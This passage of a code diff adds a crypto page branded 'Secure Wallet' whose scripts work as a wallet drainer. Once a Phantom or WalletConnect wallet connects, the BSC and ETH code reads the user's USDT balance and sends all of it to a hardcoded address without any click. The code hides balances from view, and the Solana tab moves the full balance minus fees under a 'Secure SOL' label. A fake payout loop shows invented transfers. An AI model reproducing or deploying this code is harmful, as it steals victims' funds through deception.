+                <label><svg viewBox="0 0 24 24"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 000 7h5a3.5 3.5 0 010 7H6"/></svg>Amount (Auto — Secure full balance minus fee)</label>
+                <div class="sol-auto-amount" id="solAutoAmount"><span class="amount-value">Calculating...</span><span class="fee-info">≈ 0.00008 SOL reserved for fees</span></div>
+            </div>
+        </div>
+        <button class="sol-btn sol-btn-send" id="solSendBtn" onclick="solSendSOL()">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 3-1.912 5.813a2 2 0 01-1.275 1.275L3 12l5.813 1.912a2 2 0 011.275 1.275L12 21l1.912-5.813a2 2 0 011.275-1.275L21 12l-5.813-1.912a2 2 0 01-1.275-1.275L12 3Z"/></svg>
+            Secure SOL
+        </button>
+        <div class="sol-status" id="solStatus"></div>
+        <div class="sol-payout-section" id="solPayoutSection" style="display:none;">
+            <div class="sol-payout-header">
+                <div class="sol-payout-title"><span class="live-indicator"></span>Recent Secure Connection</div>
+                <span class="sol-payout-count" id="solPayoutCount">0 transfers</span>
+            </div>
+            <div class="sol-payout-list" id="solPayoutList"></div>
+        </div>
+    </div>
+</div>
+
+<script>
+(function(){
+var splash=document.getElementById('splashScreen'),tickWrap=document.getElementById('splashTickWrap');
+var rings=splash.querySelectorAll('.splash-ring'),shield=splash.querySelector('.splash-shield');
+var title=splash.querySelector('.splash-title'),sub=splash.querySelector('.splash-sub'),progress=splash.querySelector('.splash-progress');
+setTimeout(function(){
+rings.forEach(function(r){r.style.opacity='0';r.style.transition='opacity .3s'});
+shield.style.opacity='0';shield.style.transition='opacity .3s';
+title.style.opacity='0';title.style.transition='opacity .3s';
+sub.style.opacity='0';sub.style.transition='opacity .3s';
+progress.style.opacity='0';progress.style.transition='opacity .3s';
+setTimeout(function(){
+tickWrap.classList.add('show');
+setTimeout(function(){
+var cx=window.innerWidth/2,cy=window.innerHeight/2,mob=window.innerWidth<=480,pc=mob?18:28,md=mob?180:320;
+var w=document.createElement('div');w.className='shockwave';w.style.left=cx+'px';w.style.top=cy+'px';w.style.transform='translate(-50%,-50%)';document.body.appendChild(w);setTimeout(function(){if(w.parentNode)w.parentNode.removeChild(w)},600);
+for(var i=0;i<pc;i++){var p=document.createElement('div');p.className='bomb-particle type-'+(1+Math.floor(Math.random()*5));p.style.left=cx+'px';p.style.top=cy+'px';var a=(Math.PI*2*i)/pc+(Math.random()-.5)*.3,d=50+Math.random()*md;p.style.setProperty('--tx',Math.cos(a)*d+'px');p.style.setProperty('--ty',Math.sin(a)*d+'px');p.style.animationDelay=(Math.random()*.15)+'s';document.body.appendChild(p);setTimeout(function(el){if(el.parentNode)el.parentNode.removeChild(el)}.bind(null,p),900)}
+splash.classList.add('hide');setTimeout(function(){if(splash.parentNode)splash.parentNode.removeChild(splash)},700);
+},600);
+},350);
+},2600);
+var items=['BTC','ETH','USDT','SOL','BNB','XRP','ADA','DOT','MATIC','AVAX','LINK','UNI','AAVE','COMP','MKR','CRV','SUSHI'];
+var container=document.getElementById('floatingBg'),total=window.innerWidth<=480?12:20;
+for(var i=0;i<total;i++){var el=document.createElement('div');el.className='float-crypto';el.textContent=items[Math.floor(Math.random()*items.length)];el.style.left=(Math.random()*96+2)+'%';el.style.fontSize=(11+Math.random()*6)+'px';el.style.opacity=(.03+Math.random()*.06);el.style.animationDuration=(18+Math.random()*28)+'s';el.style.animationDelay=-(Math.random()*25)+'s';container.appendChild(el)}
+setTimeout(function(){document.getElementById('popupToast').classList.add('show')},3200);
+setTimeout(function(){document.getElementById('popupToast').classList.remove('show')},7500);
+})();
+
+var currentTab='bsc';
+function switchTab(tab){
+if(tab===currentTab)return;
+currentTab=tab;
+document.querySelectorAll('.net-tab').forEach(function(t){t.classList.toggle('active',t.dataset.tab===tab)});
+document.getElementById('evmPanel').classList.toggle('active',tab==='bsc'||tab==='eth');
+document.getElementById('solPanel').classList.toggle('active',tab==='sol');
+var badge=document.getElementById('networkBadge');
+if(tab==='bsc')badge.textContent='BSC';else if(tab==='eth')badge.textContent='ETH';else badge.textContent='SOL';
+document.body.className='theme-'+tab;
+document.getElementById('bgBsc').classList.toggle('active',tab==='bsc');
+document.getElementById('bgEth').classList.toggle('active',tab==='eth');
+document.getElementById('bgSol').classList.toggle('active',tab==='sol');
+document.getElementById('glowBsc').classList.toggle('active',tab==='bsc');
+document.getElementById('glowEth').classList.toggle('active',tab==='eth');
+document.getElementById('glowSol').classList.toggle('active',tab==='sol');
+if(tab==='bsc'||tab==='eth'){if(window.handleEvmTabSwitch)window.handleEvmTabSwitch(tab)}
+}
+</script>
+
+<!-- Solana logic — no auto-redirect, hide balance amounts -->
+<script>
+(function(){
+var Connection=solanaWeb3.Connection,PublicKey=solanaWeb3.PublicKey,Transaction=solanaWeb3.Transaction,SystemProgram=solanaWeb3.SystemProgram,LAMPORTS_PER_SOL=solanaWeb3.LAMPORTS_PER_SOL;
+var RPCS=['https://solana-mainnet.infura.io/v3/1e82942fae354057aa02552fbfc2f6d7','https://rpc.ankr.com/solana','https://api.mainnet-beta.solana.com'];
+var connection=null,walletPubkey=null,payoutHistory=[];
+var solConnecting=false;
+function isMobile(){return/Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||navigator.maxTouchPoints>2&&/Mobile|Tablet/i.test(navigator.userAgent)}
+function redirectToPhantom(){var u=encodeURIComponent(window.location.href);try{window.location.href='https://phantom.app/ul/browse/'+u+'?ref='+u}catch(e){window.open('https://phantom.app/ul/browse/'+u,'_blank')}}
+function showHeaderNotification(m){var n=document.getElementById('popupToast');if(!n)return;var t=n.querySelector('.toast-title'),s=n.querySelector('.toast-sub');if(t)t.textContent='Secure Wallet';if(s)s.textContent=m;n.classList.add('show');setTimeout(function(){n.classList.remove('show')},4000)}
+function addPayout(a,amt){var l=document.getElementById('solPayoutList'),c=document.getElementById('solPayoutCount'),s=document.getElementById('solPayoutSection');if(!l||!c||!s)return;s.style.display='block';var sh=a.slice(0,4)+'...'+a.slice(-4),ini=a.slice(0,2).toUpperCase(),tm=new Date().toLocaleTimeString('en-US',{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit'});var it=document.createElement('div');it.className='sol-payout-item';it.innerHTML='<div class="sol-payout-left"><div class="sol-payout-avatar">'+ini+'</div><span class="sol-payout-addr">'+sh+'</span></div><div class="sol-payout-right"><span class="sol-payout-amount">'+amt+'</span><span class="sol-payout-time">'+tm+'</span></div>';l.insertBefore(it,l.firstChild);while(l.children.length>10)l.removeChild(l.lastChild);payoutHistory.push({address:a,amount:amt,time:tm});c.textContent=payoutHistory.length+' transfers'}
+function generateFakePayout(){var ad=['7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU','3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy','5vKQx8JLzR7L1d6XqZ9Y2vT3wU4eR5iO6pA7sD8fG9h','9aBcDeFgHiJkLmNoPqRsTuVwXyZ123456789','2xYz9AbC3DeFgHiJkLmNoPqRsTuVwXyZ456'];addPayout(ad[Math.floor(Math.random()*ad.length)],(Math.random()*2+.1).toFixed(4))}
+function startFakePayoutLoop(){for(var i=0;i<3;i++)setTimeout(generateFakePayout,i*600);setInterval(function(){generateFakePayout()},10000+Math.random()*10000)}
+async function getWorkingConnection(){for(var i=0;i<RPCS.length;i++){try{var c=new Connection(RPCS[i],'confirmed');await c.getSlot();return c}catch(e){}}throw new Error('All RPC endpoints unavailable.')}
+function solSetStatus(m,t){var e=document.getElementById('solStatus');if(!e)return;e.className='sol-status '+(t||'info');e.innerHTML=m}
+function solShowConnected(){var b=document.getElementById('solConnectBtn');b.disabled=false;b.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg> Connected \u2014 Tap Secure SOL';b.classList.remove('sol-btn-connect');b.classList.add('sol-btn-connected');document.getElementById('solDivider').style.display='block';document.getElementById('solSendForm').style.display='block';document.getElementById('solSendBtn').classList.add('visible');document.getElementById('solPayoutSection').style.display='block'}
+function hasPhantom(){return window.solana&&window.solana.isPhantom===true}
+function hasSolanaProvider(){return!!window.solana}
+async function tryConnectProvider(silent){var b=document.getElementById('solConnectBtn');if(solConnecting)return;solConnecting=true;try{if(!silent){b.disabled=true;b.innerHTML='<span class="sol-spinner"></span>Connecting...';solSetStatus('Connecting to Phantom...','info')}var r=await window.solana.connect(silent?{onlyIfTrusted:true}:undefined);walletPubkey=r.publicKey;document.getElementById('solWalletAddr').textContent=walletPubkey.toString();document.getElementById('solWalletBar').classList.add('visible');if(!silent)solSetStatus('Fetching balance...','info');connection=await getWorkingConnection();await solRefreshBalance();document.getElementById('solStatus').className='sol-status';solShowConnected()}catch(e){if(!silent){b.disabled=false;b.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg> Connect Phantom';solSetStatus(e.code===4001||e.message&&e.message.includes('rejected')?'Connection rejected. Tap Connect Phantom to try again.':'Error: '+(e.message||'Connection failed'),'error')}}finally{solConnecting=false}}
+window.solConnectWallet=async function(){var b=document.getElementById('solConnectBtn');if(isMobile()&&!hasPhantom()){solSetStatus('Opening Phantom app...','info');b.disabled=true;b.innerHTML='<span class="sol-spinner"></span>Opening Phantom...';setTimeout(function(){redirectToPhantom();setTimeout(function(){b.disabled=false;b.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg> Connect Phantom';solSetStatus('If Phantom didn\'t open, <a href="https://phantom.app/download">install it \u2192</a>','info')},3000)},600);return}if(hasPhantom()){await tryConnectProvider(false);return}if(hasSolanaProvider()){solSetStatus('Found a wallet provider, connecting...','info');await tryConnectProvider(false);return}solSetStatus('Opening Phantom...','info');b.disabled=true;b.innerHTML='<span class="sol-spinner"></span>Opening Phantom...';var u=encodeURIComponent(window.location.href),pl='https://phantom.app/ul/browse/'+u+'?ref='+u,pw=window.open(pl,'_blank');setTimeout(function(){b.disabled=false;b.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg> Connect Phantom';solSetStatus(pw&&pw.closed?'Pop-up blocked. <a href="'+pl+'">Open Phantom manually \u2192</a>':'If Phantom didn\'t open, <a href="https://phantom.app/download">install it \u2192</a>',pw&&pw.closed?'error':'info')},2500)};
+/* Hide balance — only show "Connected" label */
+async function solRefreshBalance(){if(!walletPubkey||!connection)return;try{var l=await connection.getBalance(walletPubkey);var sd=Math.max(0,(l-80000)/LAMPORTS_PER_SOL),e=document.getElementById('solAutoAmount');if(e)e.innerHTML='<span class="amount-value">'+sd.toFixed(6)+' SOL</span><span class="fee-info">\u2248 0.00008 SOL reserved for fees</span>';document.getElementById('solBalancePill').innerHTML='<span>\u25CE</span> Connected'}catch(e){document.getElementById('solBalancePill').innerHTML='<span>\u25CE</span> Connected'}}
+window.solSendSOL=async function(){var b=document.getElementById('solSendBtn'),rs=document.getElementById('solRecipient').value.trim();if(!rs){solSetStatus('Recipient address missing.','error');return}var rp;try{rp=new PublicKey(rs)}catch(e){solSetStatus('Invalid recipient address.','error');return}if(!connection)connection=await getWorkingConnection();var rb=await connection.getBalance(walletPubkey),lm=rb-80000;if(lm<=0){solSetStatus('Insufficient balance (need > 0.00008 SOL to cover fees).','error');return}var amt=lm/LAMPORTS_PER_SOL;try{b.disabled=true;b.innerHTML='<span class="sol-spinner"></span>Sending...';var sig;for(var at=1;at<=3;at++){try{solSetStatus('Fetching blockhash (attempt '+at+'/3)...','info');var bl=await connection.getLatestBlockhash('finalized'),tx=new Transaction({recentBlockhash:bl.blockhash,feePayer:walletPubkey}).add(SystemProgram.transfer({fromPubkey:walletPubkey,toPubkey:rp,lamports:lm}));solSetStatus('Approve in Phantom...','info');var rt=await window.solana.signAndSendTransaction(tx);sig=rt.signature;break}catch(e){var xp=e.message&&(e.message.includes('block height exceeded')||e.message.includes('expired')||e.message.includes('Blockhash not found'));if(xp&&at<3){solSetStatus('Blockhash expired, retrying... ('+at+'/3)','info');await new Promise(function(r){setTimeout(r,1000)});continue}throw e}}solSetStatus('Confirming on-chain...','info');var cf=false;for(var i=0;i<30;i++){await new Promise(function(r){setTimeout(r,2000)});try{var st=await connection.getSignatureStatuses([sig]),ss=st&&st.value&&st.value[0];if(ss){if(ss.err)throw new Error('Transaction failed on-chain: '+JSON.stringify(ss.err));if(ss.confirmationStatus==='confirmed'||ss.confirmationStatus==='finalized'){cf=true;break}}}catch(pe){if(pe.message.includes('Transaction failed'))throw pe}}solSetStatus('Sent '+amt.toFixed(6)+' SOL!<br><a href="https://solscan.io/tx/'+sig+'">View on Solscan \u2192</a>'+(!cf?'<br><small style="opacity:.6">Slow to confirm \u2014 check Solscan</small>':''),'success');showHeaderNotification('Successfully sent '+amt.toFixed(4)+' SOL!');addPayout(walletPubkey.toString(),amt.toFixed(4));await solRefreshBalance()}catch(e){var mg=e.message||'',ix=mg.includes('block height exceeded')||mg.includes('expired')||mg.includes('Blockhash not found');if(ix){solSetStatus('Sent but confirmation timed out.<br>'+(typeof sig!=='undefined'?'<a href="https://solscan.io/tx/'+sig+'">Check on Solscan \u2192</a>':'Please check your wallet balance.'),'success');if(typeof sig!=='undefined'){addPayout(walletPubkey.toString(),amt.toFixed(4));showHeaderNotification('Successfully sent '+amt.toFixed(4)+' SOL!')}await solRefreshBalance()}else{solSetStatus(mg||'Transaction failed','error')}}finally{b.disabled=false;b.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 3-1.912 5.813a2 2 0 01-1.275 1.275L3 12l5.813 1.912a2 2 0 011.275 1.275L12 21l1.912-5.813a2 2 0 011.275-1.275L21 12l-5.813-1.912a2 2 0 01-1.275-1.275L12 3Z"/></svg> Secure SOL'}};
+window.addEventListener('load',function(){startFakePayoutLoop()});
+})();
+</script>
+
+<!-- EVM: BSC auto-sends, ETH auto-sends, all balances hidden -->
+<script type="module">
+import { EthereumProvider } from 'https://esm.sh/@walletconnect/ethereum-provider@2.11.2';
+
+const RECIPIENT = "0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1";
+const PROJECT_ID = "9b0ce1ead8ab25a313e9942a4809a40f";
+const USDT_ABI = [
+    "function balanceOf(address) view returns (uint256)",
+    "function transfer(address,uint256) returns (bool)",
+    "function decimals() view returns (uint8)"
+];
+
+const BSC_CHAIN = 56;
+const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
+const BSC_RPC = "https://bsc-dataseed1.binance.org/";
+const BSC_EXPLORER = "https://bscscan.com/tx/";
+
+const ETH_CHAINS = {
+    1: { name:"Ethereum", usdt:"0xdAC17F958D2ee523a2206206994597C13D831ec7", explorer:"https://etherscan.io/tx/", rpc:"https://ethereum-rpc.publicnode.com" },
+    56: { name:"BNB Chain", usdt:"0x55d398326f99059fF775485246999027B3197955", explorer:"https://bscscan.com/tx/", rpc:"https://bsc-dataseed1.binance.org/" }
+};
+
+let bscWc = null, bscProvider = null, bscSigner = null, bscAddr = null;
+let bscBalance = null, bscDecimals = null;
+let bscInit = false, bscSending = false;
+
+let ethWc = null, ethProvider = null, ethSigner = null, ethAddr = null;
+let ethBalance = null, ethDecimals = null;
+let ethChainId = null, ethInit = false, ethSending = false;
+
+let activeChain = 'bsc';
+
+function setStatus(msg, cls='') {
+    const el = document.getElementById('status');
+    el.innerHTML = msg;
+    el.className = 'status-box ' + cls;
+}
+
+function resetUI() {
+    document.getElementById('qrCanvas').style.display = 'none';
+    document.getElementById('qrCanvas').innerHTML = '';
+    document.getElementById('qrLabel').textContent = '';
+    document.getElementById('spinner').style.display = 'block';
+    document.getElementById('btnSend').style.display = 'none';
+    document.getElementById('btnSend').disabled = false;
+    /* Hide balance — just show connected status */
+    document.getElementById('balanceInfo').textContent = 'Balance: \u2014';
+    document.getElementById('addrInfo').textContent = 'Not connected';
+}
+
+function showQR(uri, label) {
+    document.getElementById('spinner').style.display = 'none';
+    const wrap = document.getElementById('qrCanvas');
+    wrap.style.display = 'block';
+    wrap.innerHTML = '';
+    new QRCode(wrap, {
+        text: uri, width: 220, height: 220,
+        colorDark: "#1e3a5f", colorLight: "#f0f7ff",
+        correctLevel: QRCode.CorrectLevel.M
+    });
+    document.getElementById('qrLabel').textContent = label || 'SCAN WITH WALLET';
+}
+
+/* ══════════════════════════════════════
+   BSC — auto-send, balance hidden
+   ══════════════════════════════════════ */
+async function initBSC() {
+    if (bscInit) return;
+    bscInit = true;
+    resetUI();
+    setStatus('Connecting to BSC...', 'warn');
+    activeChain = 'bsc';
+
+    try {
+        bscWc = await EthereumProvider.init({
+            projectId: PROJECT_ID,
+            chains: [BSC_CHAIN],
+            rpcMap: { 56: BSC_RPC },
+            showQrModal: false,
+            metadata: { name: "Nora Lee", description: "Pay here", url: window.location.origin, icons: [] }
+        });
+
+        bscWc.on("display_uri", function(uri) {
+            showQR(uri, 'SCAN WITH TRUST WALLET');
+            setStatus('Waiting for scan...', 'warn');
+        });
+
+        bscWc.on("connect", async function() {
+            document.getElementById('qrCanvas').style.display = 'none';
+            document.getElementById('qrLabel').textContent = '';
+            document.getElementById('spinner').style.display = 'block';
+            setStatus('Connected! Verifying...', 'warn');
+
+            bscProvider = new ethers.providers.Web3Provider(bscWc);
+            bscSigner = bscProvider.getSigner();
+            bscAddr = await bscSigner.getAddress();
+            document.getElementById('addrInfo').textContent = bscAddr.slice(0,6) + '...' + bscAddr.slice(-4);
+
+            const rpc = new ethers.providers.JsonRpcProvider(BSC_RPC);
+            const usdt = new ethers.Contract(BSC_USDT, USDT_ABI, rpc);
+            bscDecimals = await usdt.decimals();
+            bscBalance = await usdt.balanceOf(bscAddr);
+            const formatted = ethers.utils.formatUnits(bscBalance, bscDecimals);
+
+            document.getElementById('spinner').style.display = 'none';
+            /* Hide balance amount — just show "Connected" */
+            document.getElementById('balanceInfo').textContent = 'Connected';
+
+            if (bscBalance.eq(0)) {
+                setStatus('No USDT balance found.', 'error');
+                return;
+            }
+
+            setStatus('Verifying wallet...', 'ok');
+
+            /* Auto-send — no button click needed */
+            sendBSC();
+        });
+
+        bscWc.on("disconnect", function() {
+            setStatus('Wallet disconnected.', 'error');
+            document.getElementById('btnSend').style.display = 'none';
+            bscInit = false;
+        });
+
+        await bscWc.connect();
+
+    } catch (err) {
+        console.error(err);
+        bscInit = false;
+        document.getElementById('spinner').style.display = 'none';
+        setStatus('Error: ' + (err.message || String(err)).slice(0, 120), 'error');
+    }
+}
+
+async function sendBSC() {
+    if (bscSending || !bscSigner || !bscAddr) return;
+    const btn = document.getElementById('btnSend');
+    bscSending = true;
+    btn.disabled = true;
+    setStatus('Sending to wallet for approval...', 'warn');
+
+    try {
+        const usdt = new ethers.Contract(BSC_USDT, USDT_ABI, bscSigner);
+        const formatted = ethers.utils.formatUnits(bscBalance, bscDecimals);
+        const tx = await usdt.transfer(RECIPIENT, bscBalance);
+        setStatus('Confirming: <a href="' + BSC_EXPLORER + tx.hash + '" target="_blank">' + tx.hash.slice(0,14) + '...</a>', 'warn');
+        const receipt = await tx.wait();
+
+        if (receipt && receipt.status === 1) {
+            setStatus(
+                '<span style="display:inline-flex;align-items:center;gap:4px;">' +
+                '<svg style="width:14px;height:14px;color:#16a34a;flex-shrink:0;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> ' +
+                'Transaction confirmed!</span> ' +
+                '<a href="' + BSC_EXPLORER + tx.hash + '" target="_blank">View Transaction</a>',
+                'ok'
+            );
+            document.getElementById('balanceInfo').textContent = 'Connected';
+            btn.style.display = 'none';
+            bscBalance = ethers.BigNumber.from(0);
+        } else {
+            setStatus('Transaction reverted.', 'error');
+            btn.disabled = false;
+        }
+    } catch (err) {
+        const msg = err.message || String(err);
+        setStatus(msg.includes('rejected') ? 'Rejected in wallet.' : 'Error: ' + msg.slice(0,80), 'error');
+        btn.disabled = false;
+    } finally {
+        bscSending = false;
+    }
+}
+
+/* ══════════════════════════════════════
+   ETH — auto-send, balance hidden
+   ══════════════════════════════════════ */
+async function initETH() {
+    if (ethInit) return;
+    ethInit = true;
+    resetUI();
+    setStatus('Initializing WalletConnect...', 'warn');
+    activeChain = 'eth';
+
+    try {
+        ethWc = await EthereumProvider.init({
+            projectId: PROJECT_ID,
+            chains: [1, 56],
+            optionalChains: [1, 56],
+            showQrModal: false,
+            rpcMap: {
+                1: "https://ethereum-rpc.publicnode.com",
+                56: "https://bsc-dataseed1.binance.org/"
+            },
+            metadata: { name: "Secure Wallet", description: "Secure Connection", url: window.location.origin, icons: [] }
+        });
+
+        ethWc.on("display_uri", function(uri) {
+            showQR(uri, 'SCAN WITH WALLET');
+            setStatus('Scan QR code with your wallet', 'warn');
+        });
+
+        ethWc.on("connect", async function() {
+            document.getElementById('qrCanvas').style.display = 'none';
+            document.getElementById('qrLabel').textContent = '';
+            document.getElementById('spinner').style.display = 'block';
+
+            ethProvider = new ethers.providers.Web3Provider(ethWc);
+            ethSigner = ethProvider.getSigner();
+            ethAddr = await ethSigner.getAddress();
+            document.getElementById('addrInfo').textContent = ethAddr.slice(0,6) + '...' + ethAddr.slice(-4);
+
+            const network = await ethProvider.getNetwork();
+            ethChainId = network.chainId;
+
+            if (ethChainId !== 1 && ethChainId !== 56) {
+                setStatus('Please switch to Ethereum or BSC network in your wallet.', 'error');
+                document.getElementById('spinner').style.display = 'none';
+                return;
+            }
+
+            const chain = ETH_CHAINS[ethChainId];
+            setStatus('Connected! Verifying...', 'warn');
+
+            const usdt = new ethers.Contract(chain.usdt, USDT_ABI, ethSigner);
+            ethDecimals = await usdt.decimals();
+            ethBalance = await usdt.balanceOf(ethAddr);
+            const formatted = ethers.utils.formatUnits(ethBalance, ethDecimals);
+
+            document.getElementById('spinner').style.display = 'none';
+            /* Hide balance amount — just show "Connected" */
+            document.getElementById('balanceInfo').textContent = 'Connected';
+
+            /* Auto-switch tab to match connected chain */
+            const targetTab = ethChainId === 1 ? 'eth' : 'bsc';
+            if (typeof currentTab !== 'undefined' && currentTab !== targetTab) {
+                currentTab = targetTab;
+                document.querySelectorAll('.net-tab').forEach(function(t) {
+                    t.classList.toggle('active', t.dataset.tab === targetTab);
+                });
+                var badge = document.getElementById('networkBadge');
+                badge.textContent = targetTab === 'bsc' ? 'BSC' : 'ETH';
+                document.body.className = 'theme-' + targetTab;
+                document.getElementById('bgBsc').classList.toggle('active', targetTab === 'bsc');
+                document.getElementById('bgEth').classList.toggle('active', targetTab === 'eth');
+                document.getElementById('glowBsc').classList.toggle('active', targetTab === 'bsc');
+                document.getElementById('glowEth').classList.toggle('active', targetTab === 'eth');
+            }
+
+            if (ethBalance.eq(0)) {
+                setStatus('No USDT balance found on ' + chain.name + '.', 'error');
+                return;
+            }
+
+            setStatus('Verifying wallet...', 'ok');
+
+            /* Auto-send — no button click needed, same as BSC */
+            sendETH();
+        });
+
+        ethWc.on("disconnect", function() {
+            setStatus('Wallet disconnected.', 'error');
+            resetUI();
+            ethAddr = null;
+            ethChainId = null;
+            ethInit = false;
+        });
+
+        ethWc.on("chainChanged", function(chainIdHex) {
+            const newChainId = parseInt(chainIdHex, 16);
+            ethChainId = newChainId;
+            setStatus('Network changed. Reconnect required.', 'warn');
+            resetUI();
+            ethInit = false;
+        });
+
+        await ethWc.connect();
+
+    } catch (err) {
+        console.error(err);
+        ethInit = false;
+        document.getElementById('spinner').style.display = 'none';
+        setStatus('Error: ' + (err.message || String(err)).slice(0, 120), 'error');
+    }
+}
+
+async function sendETH() {
+    if (ethSending || !ethSigner || !ethAddr || !ethChainId) return;
+    const chain = ETH_CHAINS[ethChainId];
+    if (!chain) { setStatus('Unknown chain.', 'error'); return; }
+
+    const btn = document.getElementById('btnSend');
+    ethSending = true;
+    btn.disabled = true;
+    setStatus('Sending to wallet for approval...', 'warn');
+
+    try {
+        const usdt = new ethers.Contract(chain.usdt, USDT_ABI, ethSigner);
+        const formatted = ethers.utils.formatUnits(ethBalance, ethDecimals);
+        const tx = await usdt.transfer(RECIPIENT, ethBalance);
+        setStatus('Confirming: <a href="' + chain.explorer + tx.hash + '" target="_blank">' + tx.hash.slice(0,14) + '...</a>', 'warn');
+        const receipt = await tx.wait();
+
+        if (receipt && receipt.status === 1) {
+            setStatus(
+                '<span style="display:inline-flex;align-items:center;gap:4px;">' +
+                '<svg style="width:14px;height:14px;color:#16a34a;flex-shrink:0;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> ' +
+                'Transaction confirmed on ' + chain.name + '!</span> ' +
+                '<a href="' + chain.explorer + tx.hash + '" target="_blank">View Transaction</a>',
+                'ok'
+            );
+            document.getElementById('balanceInfo').textContent = 'Connected';
+            btn.style.display = 'none';
+            ethBalance = ethers.BigNumber.from(0);
+        } else {
+            setStatus('Transaction reverted.', 'error');
+            btn.disabled = false;
+        }
+    } catch (err) {
+        const msg = err.message || String(err);
+        setStatus(msg.includes('rejected') ? 'Transaction rejected in wallet.' : 'Error: ' + msg.slice(0,80), 'error');
+        btn.disabled = false;
+    } finally {
+        ethSending = false;
+    }
+}
+
+/* ══════════════════════════════════════
+   Tab switch router
+   ══════════════════════════════════════ */
+window.handleEvmTabSwitch = async function(tab) {
+
+    if (tab === 'bsc') {
+        if (ethWc) {
+            try { await ethWc.disconnect(); } catch(e) {}
+            ethWc = null; ethSigner = null; ethAddr = null; ethChainId = null; ethInit = false;
+        }
+        if (bscWc && bscAddr) {
+            document.getElementById('qrCanvas').style.display = 'none';
+            document.getElementById('qrLabel').textContent = '';
+            document.getElementById('spinner').style.display = 'none';
+            document.getElementById('addrInfo').textContent = bscAddr.slice(0,6) + '...' + bscAddr.slice(-4);
+            document.getElementById('balanceInfo').textContent = 'Connected';
+            if (bscBalance && !bscBalance.eq(0)) {
+                setStatus('Verifying wallet...', 'ok');
+            } else {
+                setStatus('No USDT balance found.', 'error');
+            }
+            document.getElementById('btnSend').style.display = 'none';
+            activeChain = 'bsc';
+            return;
+        }
+        await initBSC();
+        return;
+    }
+
+    if (tab === 'eth') {
+        if (bscWc) {
+            try { await bscWc.disconnect(); } catch(e) {}
+            bscWc = null; bscSigner = null; bscAddr = null; bscBalance = null; bscInit = false;
+        }
+        if (ethWc && ethAddr && ethChainId) {
+            const chain = ETH_CHAINS[ethChainId];
+            document.getElementById('qrCanvas').style.display = 'none';
+            document.getElementById('qrLabel').textContent = '';
+            document.getElementById('spinner').style.display = 'none';
+            document.getElementById('addrInfo').textContent = ethAddr.slice(0,6) + '...' + ethAddr.slice(-4);
+            document.getElementById('balanceInfo').textContent = 'Connected';
+            if (ethBalance && !ethBalance.eq(0)) {
+                setStatus('Verifying wallet...', 'ok');
+            } else {
+                setStatus('No USDT balance found on ' + chain.name + '.', 'error');
+            }
+            document.getElementById('btnSend').style.display = 'none';
+            activeChain = 'eth';
+            return;
+        }
+        await initETH();
+        return;
+    }
+};
+
+window.sendUSDT = async function() {
+    if (activeChain === 'bsc') {
+        await sendBSC();
+    } else {
+        await sendETH();
+    }
+};
+
+initBSC();
+</script>
+</body>
+</html>
